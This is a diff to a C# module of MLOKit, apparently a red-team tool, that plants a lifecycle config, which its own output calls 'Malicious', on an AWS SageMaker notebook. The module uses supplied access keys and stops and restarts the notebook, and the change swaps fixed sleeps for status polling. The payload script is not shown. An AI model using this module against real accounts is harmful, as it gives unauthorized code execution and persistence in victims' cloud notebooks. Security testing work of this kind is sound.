@@ -42,7 +42,8 @@ namespace MLOKit.Modules.SageMaker
                 AmazonSageMakerClient sagemakerClient = new AmazonSageMakerClient(accessKey, secretKey, endpoint);
 
                 // if the script file provided exists, proceed
-                if (File.Exists(script)){
+                if (File.Exists(script))
+                {
 
                     // Create lifecycle config
                     Console.WriteLine("[*] INFO: Creating notebook instance lifecycle config");
@@ -61,55 +62,51 @@ namespace MLOKit.Modules.SageMaker
                         Console.WriteLine("");
                     }
 
+                    // get notebook status
+                    string notebookStatus = await Utilities.SageMaker.NotebookUtils.getNotebookStatus(sagemakerClient, notebookName);
 
-                    // Stop target notebook instance
-                    Console.WriteLine("[*] INFO: Stopping target notebook instance with name: " + notebookName);
-                    Console.WriteLine("");
-                    StopNotebookInstanceRequest stopNotebook = new StopNotebookInstanceRequest();
-                    stopNotebook.NotebookInstanceName = notebookName;
-                    StopNotebookInstanceResponse stopNotebookResponse = await sagemakerClient.StopNotebookInstanceAsync(stopNotebook);
-
-                    if (stopNotebookResponse.HttpStatusCode.ToString().ToLower().Equals("ok"))
+                    // if notebook is not "Stopped" then stop it it
+                    if (!notebookStatus.ToLower().Equals("stopped"))
                     {
 
-                        string nextToken = null;
-                        var notebookRequest = new ListNotebookInstancesRequest
+                        // Stop target notebook instance
+                        Console.WriteLine("[*] INFO: Stopping target notebook instance with name: " + notebookName);
+                        Console.WriteLine("");
+                        StopNotebookInstanceRequest stopNotebook = new StopNotebookInstanceRequest();
+                        stopNotebook.NotebookInstanceName = notebookName;
+                        StopNotebookInstanceResponse stopNotebookResponse = await sagemakerClient.StopNotebookInstanceAsync(stopNotebook);
+
+                        Console.WriteLine("[*] INFO: Waiting for notebook instance to stop before proceeding (can take up to 10 minutes)");
+
+                        // wait to proceed until notebook stops
+                        while (await Utilities.SageMaker.NotebookUtils.getNotebookStatus(sagemakerClient, notebookName) != "Stopped")
                         {
-                            MaxResults = 100, // Optional: control page size (max 100)
-                            NextToken = nextToken
-                        };
-                        notebookRequest.NameContains = notebookName;
-                        ListNotebookInstancesResponse response = await sagemakerClient.ListNotebookInstancesAsync(notebookRequest);
-
-                        if (response.HttpStatusCode.ToString().ToLower().Equals("ok"))
-                        {
-                            // create table header
-                            string tableHeader = string.Format("{0,50} | {1,20} | {2,20} | {3,30}", "Notebook Name", "Creation Date", "Notebook Status", "Notebook Lifecycle Config");
-                            Console.WriteLine(tableHeader);
-                            Console.WriteLine(new String('-', tableHeader.Length));
-
-                            // iterate through each notebook and list details
-                            foreach (var notebook in response.NotebookInstances)
-                            {
-                                string creationTime = notebook.CreationTime.ToShortDateString();
-                                Console.WriteLine("{0,50} | {1,20} | {2,20} | {3,30}", notebook.NotebookInstanceName, creationTime, notebook.NotebookInstanceStatus, notebook.NotebookInstanceLifecycleConfigName);
-                            }
-
+                            // do nothing
                         }
+
+                        Console.WriteLine("");
+                        Console.WriteLine("[+] SUCCESS: Notebook has been stopped");
+                        Console.WriteLine("");
+                    }
+
+                    DescribeNotebookInstanceRequest notebookRequest = new DescribeNotebookInstanceRequest();
+                    notebookRequest.NotebookInstanceName = notebookName;
+                    DescribeNotebookInstanceResponse response = await sagemakerClient.DescribeNotebookInstanceAsync(notebookRequest);
+
+                    if (response.HttpStatusCode.ToString().ToLower().Equals("ok"))
+                    {
+                        // create table header
+                        string tableHeader = string.Format("{0,50} | {1,20} | {2,20} | {3,30}", "Notebook Name", "Creation Date", "Notebook Status", "Notebook Lifecycle Config");
+                        Console.WriteLine(tableHeader);
+                        Console.WriteLine(new String('-', tableHeader.Length));
+                        string creationTime = response.CreationTime.ToShortDateString();
+                        Console.WriteLine("{0,50} | {1,20} | {2,20} | {3,30}", response.NotebookInstanceName, creationTime, response.NotebookInstanceStatus, response.NotebookInstanceLifecycleConfigName);
 
                     }
 
-                    // sleep for 2 minutes to allow time for notebook to stop
-                    Console.WriteLine("");
-                    Console.WriteLine("[*] INFO: Sleeping for 2 minutes to allow time for notebook to stop");
-                    Console.WriteLine("");
-                    Thread.Sleep(120000);
-                    Console.WriteLine("[+] SUCCESS: Notebook instance with name of " + notebookName + " has been stopped successfully.");
-                    Console.WriteLine("");
-
-
                     // Update lifecycle config for target notebook instance
-                    Console.WriteLine("[*] INFO: Updated notebook named " + notebookName + "with lifecycle config with name " + randomConfigName);
+                    Console.WriteLine("");
+                    Console.WriteLine("[*] INFO: Updated notebook named " + notebookName + " with lifecycle config with name " + randomConfigName);
                     Console.WriteLine("");
                     UpdateNotebookInstanceRequest updateNotebook = new UpdateNotebookInstanceRequest();
                     updateNotebook.LifecycleConfigName = randomConfigName;
@@ -118,78 +115,72 @@ namespace MLOKit.Modules.SageMaker
 
                     if (updateNotebookResponse.HttpStatusCode.ToString().ToLower().Equals("ok"))
                     {
-                       
+
+                        // sleep for 2 minutes to allow time for notebook lifecycle config change to take place
+                        Console.WriteLine("[*] INFO: Sleeping for 2 minutes to allow time for notebook instance lifecycle config to be assigned");
+                        Console.WriteLine("");
+                        Thread.Sleep(120000);
+                        Console.WriteLine("[+] SUCCESS: Malicious notebook instance lifecycle config assigned to notebook with name: " + notebookName);
+                        Console.WriteLine("");
+
                         // create table header
                         string tableHeader = string.Format("{0,50} | {1,20} | {2,20} | {3,30}", "Notebook Name", "Creation Date", "Notebook Status", "Notebook Lifecycle Config");
                         Console.WriteLine(tableHeader);
                         Console.WriteLine(new String('-', tableHeader.Length));
 
-                        string nextToken = null;
-                        var notebookRequest = new ListNotebookInstancesRequest
-                        {
-                            MaxResults = 100, // Optional: control page size (max 100)
-                            NextToken = nextToken
-                        };
-                        notebookRequest.NameContains = notebookName;
-                        ListNotebookInstancesResponse response = await sagemakerClient.ListNotebookInstancesAsync(notebookRequest);
+                        DescribeNotebookInstanceRequest notebookRequestTwo = new DescribeNotebookInstanceRequest();
+                        notebookRequestTwo.NotebookInstanceName = notebookName;
+                        DescribeNotebookInstanceResponse notebookResponseTwo = await sagemakerClient.DescribeNotebookInstanceAsync(notebookRequestTwo);
 
-                        // iterate through each notebook and list details
-                        foreach (var notebook in response.NotebookInstances)
+                        if (notebookResponseTwo.HttpStatusCode.ToString().ToLower().Equals("ok"))
                         {
-                            string creationTime = notebook.CreationTime.ToShortDateString();
-                            Console.WriteLine("{0,50} | {1,20} | {2,20} | {3,30}", notebook.NotebookInstanceName, creationTime, notebook.NotebookInstanceStatus, notebook.NotebookInstanceLifecycleConfigName);
+                            // create table header
+                            string creationTime = notebookResponseTwo.CreationTime.ToShortDateString();
+                            Console.WriteLine("{0,50} | {1,20} | {2,20} | {3,30}", notebookResponseTwo.NotebookInstanceName, creationTime, notebookResponseTwo.NotebookInstanceStatus, notebookResponseTwo.NotebookInstanceLifecycleConfigName);
+
                         }
 
                     }
 
-                    // sleep for 2 minutes to allow time for notebook lifecycle config change to take place
-                    Console.WriteLine("");
-                    Console.WriteLine("[*] INFO: Sleeping for 2 minutes to allow time for notebook instance lifecycle config to be assigned");
-                    Console.WriteLine("");
-                    Thread.Sleep(120000);
-                    Console.WriteLine("[+] SUCCESS: Malicious notebook instance lifecycle config assigned to notebook with name: " + notebookName);
-                    Console.WriteLine("");
+                    // get notebook status
+                    string notebookStatusTwo = await Utilities.SageMaker.NotebookUtils.getNotebookStatus(sagemakerClient, notebookName);
 
-
-                    // Start target notebook instance
-                    Console.WriteLine("[*] INFO: Starting target notebook instance with name: " + notebookName);
-                    Console.WriteLine("");
-                    StartNotebookInstanceRequest startNotebook = new StartNotebookInstanceRequest();
-                    startNotebook.NotebookInstanceName = notebookName;
-                    StartNotebookInstanceResponse startNotebookResponse = await sagemakerClient.StartNotebookInstanceAsync(startNotebook);
-
-                    if (startNotebookResponse.HttpStatusCode.ToString().ToLower().Equals("ok"))
+                    // if notebook is not "InService" then start it
+                    if (!notebookStatusTwo.ToLower().Equals("inservice"))
                     {
+                        Console.WriteLine("");
+                        Console.WriteLine("[*] INFO: Starting Notebook instance with name - " + notebookName);
 
-                        // create table header
+                        StartNotebookInstanceRequest startNotebook = new StartNotebookInstanceRequest();
+                        startNotebook.NotebookInstanceName = notebookName;
+                        StartNotebookInstanceResponse startNotebookResponse = await sagemakerClient.StartNotebookInstanceAsync(startNotebook);
+
+                        Console.WriteLine("");
+                        Console.WriteLine("[*] INFO: Waiting for notebook instance to start before proceeding (can take up to 10 minutes)");
+
+                        // wait to proceed until notebook comes online
+                        while (await Utilities.SageMaker.NotebookUtils.getNotebookStatus(sagemakerClient, notebookName) != "InService")
+                        {
+                            // do nothing
+                        }
+
+                        Console.WriteLine("");
+                        Console.WriteLine("[+] SUCCESS: Notebook has been started");
+
                         string tableHeader = string.Format("{0,50} | {1,20} | {2,20} | {3,30}", "Notebook Name", "Creation Date", "Notebook Status", "Notebook Lifecycle Config");
                         Console.WriteLine(tableHeader);
                         Console.WriteLine(new String('-', tableHeader.Length));
-                        string nextToken = null;
-                        var notebookRequest = new ListNotebookInstancesRequest
-                        {
-                            MaxResults = 100, // Optional: control page size (max 100)
-                            NextToken = nextToken
-                        };
-                        notebookRequest.NameContains = notebookName;
-                        ListNotebookInstancesResponse response = await sagemakerClient.ListNotebookInstancesAsync(notebookRequest);
+                        DescribeNotebookInstanceRequest lastNotebookRequest = new DescribeNotebookInstanceRequest();
+                        lastNotebookRequest.NotebookInstanceName = notebookName;
+                        DescribeNotebookInstanceResponse lastNotebookResponse = await sagemakerClient.DescribeNotebookInstanceAsync(lastNotebookRequest);
 
-                        // iterate through each notebook and list details
-                        foreach (var notebook in response.NotebookInstances)
+                        if (lastNotebookResponse.HttpStatusCode.ToString().ToLower().Equals("ok"))
                         {
-                            string creationTime = notebook.CreationTime.ToShortDateString();
-                            Console.WriteLine("{0,50} | {1,20} | {2,20} | {3,30}", notebook.NotebookInstanceName, creationTime, notebook.NotebookInstanceStatus, notebook.NotebookInstanceLifecycleConfigName);
+                            string creationTime = lastNotebookResponse.CreationTime.ToShortDateString();
+                            Console.WriteLine("{0,50} | {1,20} | {2,20} | {3,30}", lastNotebookResponse.NotebookInstanceName, creationTime, lastNotebookResponse.NotebookInstanceStatus, lastNotebookResponse.NotebookInstanceLifecycleConfigName);
+
                         }
-
                     }
-
-                    // sleep for 2 minutes to allow time for notebook instance to start
-                    Console.WriteLine("");
-                    Console.WriteLine("[*] INFO: Sleeping for 2 minutes to allow time for notebook to start");
-                    Console.WriteLine("");
-                    Thread.Sleep(120000);
-                    Console.WriteLine("[+] SUCCESS: Successfully started notebook with name: " + notebookName);
-                    Console.WriteLine("");
 
                 }
                 // otherwise display error and return
@@ -204,7 +195,7 @@ namespace MLOKit.Modules.SageMaker
 
 
 
-               
+
 
 
             }
